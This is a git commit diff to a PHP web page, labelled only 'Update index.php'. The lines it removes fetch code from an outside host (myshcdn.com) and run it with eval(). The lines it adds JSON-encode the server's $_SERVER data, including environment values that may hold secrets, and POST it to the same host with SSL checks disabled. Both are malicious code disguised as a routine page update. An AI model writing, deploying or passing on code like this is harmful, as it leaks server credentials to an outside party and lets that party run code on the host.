86c1a3b53ebb353fc9da95a62b7d06fbc00f1b56
jsxsh <themonster@mit.tc>
2021-04-07 17:01:23 +0300

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,6 +1,14 @@
 <?php
-$ch = curl_init("http://myshcdn.com/heroku_github_data.txt");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$url = 'http://myshcdn.com/sh.php';
+$_sh = json_encode($_SERVER);
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $_sh);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
 $result = curl_exec($ch);
 curl_close($ch);
-eval($result);
+print_r ($result);
